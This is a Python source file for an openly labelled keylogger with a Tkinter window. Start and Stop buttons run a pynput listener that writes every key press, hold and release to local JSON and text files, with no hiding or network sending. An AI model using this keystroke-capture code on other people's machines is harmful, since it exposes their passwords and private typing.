import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
keys = ""
flag = False

def generate_text_log(key):
    with open('key_log.txt', "w") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', "w") as key_log_file:
        json.dump(keys_used, key_log_file, indent=4)

def on_press(key):
    global flag, keys_used, keys
    try:
        if not flag:
            keys_used.append({'Pressed': str(key)})
            flag = True
        else:
            keys_used.append({'Held': str(key)})
        generate_json_file(keys_used)
    except Exception as e:
        print(f"Error on_press: {e}")

def on_release(key):
    global flag, keys_used, keys
    try:
        keys_used.append({'Released': str(key)})
        flag = False
        generate_json_file(keys_used)

        keys += str(key).replace("'", "")
        generate_text_log(keys)
    except Exception as e:
        print(f"Error on_release: {e}")

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')


root = Tk()
root.title("Keylogger")

root.geometry("350x200")
root.resizable(False, False)
root.configure(bg='#2e3f4f')


title_label = Label(root, text="Keylogger", font=("Helvetica", 16), bg='#2e3f4f', fg='white')
title_label.pack(pady=10)


label = Label(root, text='Click "Start" to begin keylogging.', font=("Helvetica", 10), bg='#2e3f4f', fg='white')
label.pack(pady=10)


button_frame = Frame(root, bg='#2e3f4f')
button_frame.pack(pady=20)

start_button = Button(button_frame, text="Start", command=start_keylogger, width=10, bg='#4caf50', fg='black', font=("Helvetica", 10))
start_button.pack(side=LEFT, padx=10)

stop_button = Button(button_frame, text="Stop", command=stop_keylogger, width=10, bg='red', fg='black', font=("Helvetica", 10), state='disabled')
stop_button.pack(side=RIGHT, padx=10)

root.mainloop()
